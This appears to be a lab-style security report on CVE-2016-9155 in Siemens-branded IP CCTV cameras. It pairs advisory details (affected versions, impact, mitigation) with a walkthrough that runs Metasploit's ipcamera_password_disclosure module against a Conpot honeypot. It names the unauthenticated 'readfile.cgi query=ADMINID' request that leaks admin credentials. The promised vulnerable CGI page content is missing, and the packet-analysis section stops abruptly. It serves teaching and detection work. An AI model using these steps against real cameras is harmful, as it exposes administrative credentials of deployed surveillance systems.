

# OVERVIEW
In this report, we will focus on Siemens IP CCTV Cameras. We will use Honeypot as the target. This Report provides:

* Vulnerability details for Siemens IP CCTV Cameras
* Mitigation details for a vulnerability affecting the Siemens IP CCTV Cameras.
* Disclosure of exploit runs on HTTP protocol.
* Simulating an attack scenario against Scada Honeypot (Conpot)
* HTTP attack diagnostic functions in Wireshark
* Writing IDS rules to detect attack


##  VANDERBILT INDUSTRIES SIEMENS IP CCTV CAMERAS VULNERABILITY

Siemens reports that there is a vulnerability in Siemens-branded IP cameras from Vanderbilt Industries. Vanderbilt has released updates to mitigate this vulnerability.
This vulnerability could be exploited remotely.

## Affected Products

Siemens reports that the vulnerability affects the following versions of Siemens-branded IP cameras built by Vanderbilt Industries:

* CCMW3025: All versions prior to 1.41_SP18_S1
* CVMW3025-IR: All versions prior to 1.41_SP18_S1
* CFMW3025: All versions prior to 1.41_SP18_S1
* CCPW3025: All versions prior to 0.1.73_S1
* CCPW5025: All versions prior to 0.1.73_S1
* CCMD3025-DN18: All versions prior to v1.394_S1
* CCID1445-DN18: All versions prior to v2635
* CCID1445-DN28: All versions prior to v2635
* CCID1445-DN36: All versions prior to v2635
* CFIS1425: All versions prior to v2635
* CCIS1425: All versions prior to v2635
* CFMS2025: All versions prior to v2635
* CCMS2025: All versions prior to v2635
* CVMS2025-IR: All versions prior to v2635
* CFMW1025: All versions prior to v2635
* CCMW1025: All versions prior to v2635


## IMPACT
A successful exploit of this vulnerability may allow the attacker to obtain administrative credentials.
Impact to individual organizations depends on many factors that are unique to each organization.

## BACKGROUND

Vanderbilt Industries acquired the SIEMENS IP Cameras business in June 2015 and released updates for the affected camera models under the SIEMENS brand.

The SIEMENS-branded IP-based CCTV cameras portfolio includes a range of megapixel cameras in various configuration and mounting options. According to Vanderbilt, these products are deployed across several sectors including Commercial Facilities, Healthcare and Public Health, and Government Facilities. Vanderbilt estimates that these products are used worldwide.

## VULNERABILITY CHARACTERIZATION

### VULNERABILITY OVERVIEW

### _INSUFFICIENTLY PROTECTED CREDENTIALS_
An attacker with network access to the web server could obtain administrative credentials by sending certain requests.

CVE-2016-9155 has been assigned to this vulnerability. A CVSS v3 base score of 9.8 has been calculated; the CVSS vector string is (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H).

## VULNERABILITY DETAILS
### EXPLOITABILITY
This vulnerability could be exploited remotely.

### EXISTENCE OF EXPLOIT
No known public exploits specifically target this vulnerability.

### DIFFICULTY
An attacker with a low skill would be able to exploit this vulnerability.

## MITIGATION
Vanderbilt has released updates to mitigate this vulnerability. For links to the new versions for each of the affected models, please see Siemens Security Advisory SSA-284765 at the following location:

http://www.siemens.com/cert/advisories

Siemens recommends that users operate the devices within trusted networks and protect network access to the devices with appropriate mechanisms. Siemens also recommends enabling authentication on the web server.

-------------------------------------------------------------------

# Vulnerable Application

This module has been verified against the mock vulnerable Honeypot(Conpot).

We are going to use auxiliary/gather/ipcamera_password_disclosure exploit from metasploit framework.

## _What does this exploit do?

_SIEMENS IP-Camera (CVMS2025-IR + CCMS2025), JVC IP-Camera (VN-T216VPRU), and Vanderbilt IP-Camera (CCPW3025-IR + CVMW3025-IR) allow an unauthenticated user to disclose the username & password by requesting the javascript page 'readfile.cgi query=ADMINID'. 
Siemens firmwares affected: 
_* x.2.2.1798 
_*  CxMS2025_V2458_SP1 
_*  x.2.2.1798, x.2.2.1235

These instructions will create a cgi environment and a vulnerable perl application for exploitation. Kali rolling was utilized for this tutorial, with apache.

Setup

1. Enable cgi: `a2enmod cgid`
2. `mkdir /var/www/html/cgi-bin`
3. Enable folder for cgi execution: add `ScriptAlias "/cgi-bin/" "/var/www/html/cgi-bin/"` to `/etc/apache2/sites-enabled/000-default.conf ` inside of the `VirtualHost` tags
4. Create the vulnerable page by writing the following text to `/var/www/html/cgi-bin/readfile.cgi`:


In order to exploit the vulnerability we need to download [Metasploit](https://github.com/rapid7/metasploit-framework)<br>

After downloading metasploit we can run it by typing;

```
msfconsole
```

We can see the Siemens modules by typing;

```
search siemens
```

We are going to use auxiliary/gather/ipcamera_password_disclosure exploit here. So enter command below.

```
use auxiliary/gather/ipcamera_password_disclosure
```

```
show options
```

<p align="center">
  
  <img src="https://github.com/ics-scada/Reports/blob/main/Siemens%20IP%20CCTV%20Cameras/ip_camera_password_disclosure_screenshoots/1.PNG">
</p>

`RHOST` = remote host ip address,<br>

paramateres.

```
set RHOSTS <ip>
```
<p align="center">
  <img src="https://github.com/ics-scada/Reports/blob/main/Siemens%20IP%20CCTV%20Cameras/ip_camera_password_disclosure_screenshoots/2.PNG">
</p>


After giving the parameters which are required we are ready to run it.

```
run
```
<p align="center">
  <img src="https://github.com/ics-scada/Reports/blob/main/Siemens%20IP%20CCTV%20Cameras/ip_camera_password_disclosure_screenshoots/2.1.PNG">
</p>

As you can see above, attack has started.
***
# Packet Analysing
Run wireshark while exploit we’ve use running behind.
